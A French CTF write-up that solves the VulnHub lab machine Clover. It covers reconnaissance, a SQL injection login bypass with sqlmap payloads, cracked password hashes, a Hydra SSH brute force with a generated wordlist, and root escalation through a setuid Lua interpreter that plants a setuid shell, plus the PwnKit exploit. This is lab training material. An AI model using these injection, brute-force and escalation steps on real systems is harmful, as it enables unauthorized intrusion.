# Solution du CTF Clover de VulnHub

[Clover](https://vulnhub.com/entry/clover-1,687/) est un CTF signé [0xJin & 0xBushido](https://vulnhub.com/author/0xjin-0xbushido,787/) et disponible sur VulnHub. On peut regréter que l'image virtuelle pèse 2.4Go, il faut dire qu'elle fait tourner le gestionnaire de fenêtres Gnome qui est bien sûr inutile pour un tel challenge.

```
Nmap scan report for 192.168.56.99
Host is up (0.00033s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Mar 26  2021 maintenance
22/tcp   open   ssh        OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 bca7bf7f23835508f7d19a9246c6ad2d (DSA)
|   2048 96bdc2571c917b0ab9495e7fd137a665 (RSA)
|   256 b9d99d58b85c61f236d9b214e8003c05 (ECDSA)
|_  256 242965286efa076af16bfa07a0131bb6 (ED25519)
80/tcp   open   http       Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 3 disallowed entries 
|_/admin /root /webmaster
110/tcp  closed pop3
443/tcp  closed https
5781/tcp closed 3par-evts
8080/tcp closed http-proxy
```

On ne trouve rien d'intéressant sur le FTP : 3 fichiers texte sans intérêt. On ne dispose pas de droits en écriture ni sur les dossiers ni sur les fichiers et on ne peut pas remonter l'arboresence.

## Danny Clover

Les autres ports étant fermés il ne reste que le port 80 qui semble intéressant.

Aucun des dossiers mentionné dans le `robots.txt` n'existe mais `feroxbuster` retrouve différents dossiers présents sur le serveur :

```
301        9l       28w      319c http://192.168.56.99/javascript
301        9l       28w      319c http://192.168.56.99/phpmyadmin
301        9l       28w      324c http://192.168.56.99/phpmyadmin/docs
301        9l       28w      329c http://192.168.56.99/phpmyadmin/docs/html
301        9l       28w      314c http://192.168.56.99/CFIDE
301        9l       28w      316c http://192.168.56.99/website
301        9l       28w      323c http://192.168.56.99/website/images
301        9l       28w      324c http://192.168.56.99/website/scripts
200        1l        2w       10c http://192.168.56.99/status
301        9l       28w      323c http://192.168.56.99/website/styles
403        9l       28w      278c http://192.168.56.99/phpmyadmin/libraries
301        9l       28w      326c http://192.168.56.99/phpmyadmin/themes
```

Dans `CFIDE` on trouve un dossier `Administrator` car le listing est activé. On est alors face à une page web dans laquelle je finis par remarquer le commentaire HTML suivant :

```html
<!-- Please Disable: /login.php this page doesn't exist, disable test login form.-->      
```

Le script en question existe bien et est vulnérable à une injection SQL. En effet si je saisis le nom d'utilisateur admin et le mot de passe `' or '1'='1` le script m'indique que je suis connecté.

Aucun lien n'est présent dans la page, le script a visiblement comme seul intérêt d'être vulnérable. On va se servir de `sqlmap` pour essayer d'extraire de la base des données des informations utiles pour la suite du CTF.

```bash
python sqlmap.py -u "http://192.168.56.99/CFIDE/Administrator/login.php" --dbms mysql --data "uname=admin&pswd=123456" --risk 3 --level 5
```

Les deux paramètres sont vulnérables :

```
sqlmap identified the following injection point(s) with a total of 721 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-6282' OR 3655=3655-- oYbk&pswd=123456

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 8104 FROM (SELECT(SLEEP(5)))DJsB)-- RDqi&pswd=123456

Parameter: pswd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&pswd=-4249' OR 5766=5766-- lBSE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin&pswd=123456' AND (SELECT 5948 FROM (SELECT(SLEEP(5)))CLdE)-- eYHt
---
```

Je peux utiliser l'option `--passwords` de `sqlmap` qui me retourne le hash de l'utilisateur root :

```
[*] root [1]:
    password hash: *EE2227E76B10DEA20C821828D6885879FF245EF6
```

Le mot de passe (`astaasta`) est facilement cassé avec https://crackstation.net/

On découvre aussi une base de données nommée `clover` qui a la table `users` suivante :

```
Database: clover
Table: users
[3 entries]
+----+-----------+----------------------------------+
| id | username  | password                         |
+----+-----------+----------------------------------+
| 1  | 0xBush1do | 33a41c7507cy5031d9tref6fdb31880c |
| 2  | asta      | 69a41c7507ad7031d9decf6fdb31810c |
| 3  | 0xJin     | 92ift37507ad7031d9decf98setf4w0c |
+----+-----------+----------------------------------+
```

Seul `asta` dispose d'un hash MD5 valide, les autres contiennent des caractères `y` et `t`.

Il y a peu de sites de reverse MD5 qui ont le hash dans leur base mais je finis par en trouver un qui l'a. Le mot de passe en clair est `asta$$123`.

On peut se connecter en SSH et accéder au premier flag :

```shellsession
asta@Clover:~$ cat local.txt 



                                |     |
                                \\_V_//
                                \/=|=\/
       Asta PWN!                 [=v=]
                               __\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\ \@/ C / /
       ___      ___   ]/000o   /__\ \ C / /
          \    /              /....\ \_/ /
       ....\||/....           [___/=\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \___]
     .    0 .. 0    .         <---> <--->
  /\/\.    .  .    ./\/\      [..]   [..]
 / / / .../|  |\... \ \ \    _[__]   [__]_
/ / /       \/       \ \ \  [____>   <____]



34f35ca9ea7febe859be7715b707d684
```

Une énumération locale via `LinPEAS` remonte quelques vulnérabilités *classiques* telles `Dirty COW` et `Sudo Baron Samedit`.

Toutefois les exploits `Dirty COW` ne semblent pas aboutir (sans doute le système est patché) et pour la faille `sudo` on est géné par le fait que le binaire `python` utile à l'exploit a été mis en accès pour root uniquement.

Heureusement je disposais d'une autre VM avec le même système (Debian 8, 64bits) et j'ai pu copier `python` mais finalement le système n'était pas non plus vulnérable.

A noter que `gcc` est aussi absent de la VM donc il faut compiler en static pour copier les binaires pour exploiter telle ou telle vulnérabilité (voir plus loin pour `PwnKit`)

## Harry Clover

Mais le CTF a en réalité un cheminement officiel sans exploits qui était un peu difficile à trouver.

Il y a un fichier de backup concernant l'utilisateur `sword` mais le propriétaire du fichier ne correspondait pas à cet utilisateur (donc un `find` spécifique ne le retournait pas) :

```shellsession
asta@Clover:/tmp$ ls /var/backups/reminder/ -al
total 12
drwxr-xr-x 2 root root 4096 Mar 27  2021 .
drwxr-xr-x 3 root root 4096 Feb 14 03:07 ..
-rw-r--r-- 1 root root  144 Mar 27  2021 passwd.sword
asta@Clover:/tmp$ cat /var/backups/reminder/passwd.sword
Oh well, this is a reminder for Sword's password. I just remember this:

passwd sword: P4SsW0rD**** 

I forgot the last four numerical digits!
```

On génère une wordlist correspondant à ces cas :

```python
with open("passwords.txt", "w") as fd:
    for i in range(0, 10000):
        password = f"P4SsW0rD{i:04}"
        print(password, file=fd)
```

Et on lance `Hydra` sur le service SSH :

```bash
hydra -l sword -P /tmp/passwords.txt ssh://192.168.56.99
```

Après 40 minutes on obtient le mot de passe :

```
[22][ssh] host: 192.168.56.99   login: sword   password: P4SsW0rD4286
```

L'utilisateur dispose d'un flag lui aussi :

```shellsession
sword@Clover:~$ cat local2.txt 





     /\
    // \
    || |
    || |
    || |      Sword PWN!
    || |
    || |
    || |
 __ || | __
/___||_|___\
     ww
     MM
    _MM_
   (&<>&)
    ~~~~




e63a186943f8c1258cd1afde7722fbb4
```

On peut relancer `LinPEAS` ou fouiller par nous même les fichiers appartenant à root et qui sont écrivables :

```shellsession
sword@Clover:~$ find / -type f -writable -user root 2> /dev/null | grep -v /proc | grep -v /sys
/usr/games/clover/deamon.sh
```

Si `LinPEAS` n'a pas remarqué le fichier précédemment c'est parce que le dossier où il se trouve n'est accessible que par l'utilisateur `sword`.

Il s'avère que le fichier `daemon.sh` est un binaire ELF et dispose du bit setuid root. Ce serait donc domage de l'écraser (il perdrait le bit setuid).

A l'exécution on découvre aussi qu'il s'agit de l'interpréteur Lua. J'ai repris la technique d'exécution que j'avais croisé sur [le CTF Nebula ](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Nebula%20(levels%2012%20%C3%A0%2019).md).

```shellsession
sword@Clover:~$ /usr/games/clover/deamon.sh
Lua 5.2.3  Copyright (C) 1994-2013 Lua.org, PUC-Rio
> prog = io.popen("id")
> data = prog:read("*all")
> prog:close()
> print(data)
uid=1001(sword) gid=1001(sword) euid=0(root) groups=1001(sword)

> prog = io.popen("cp /bin/dash /tmp/shell;chown root:root /tmp/shell;chmod 4755 /tmp/shell")
```

On obtient alors un shell setuid root à /tmp/shell.

## Kansas City Shuffle

L'autre technique consiste à utiliser l'exploit `PwnKit`. Il faut disposer d'une certaine version de la libc pour que l'exploit fonctionne donc compiler même en statique sur une machine plus récente échouera.

Heureusement comme dis plus tôt je disposais d'une VM équivalente. A vrai dire j'avais même l'exploit `PwnKit` déjà compilé dessus :)

[GitHub - ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation](https://github.com/ly4k/PwnKit/tree/main)

```shellsession
asta@Clover:/tmp$ ./PwnKit 
root@Clover:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),118(bluetooth),1000(asta)
root@Clover:/tmp# cd /root
root@Clover:~# ls
proof.txt
root@Clover:~# cat proof.txt




             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |  # whoami                               |    |
           |   |  # root                                 |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |     Congratulations You PWN Clover!     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |    974bd350558b912740f800a316c53afe     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---'



// From 0xJin && 0xBush1do! If you root this, tag me on Twitter! @0xJin and @0xBush1do
```

CTF plutôt bien ficelé. Le chemin officiel demandais un peu de recherche manuelle.

*Publié le 14 février 2023*
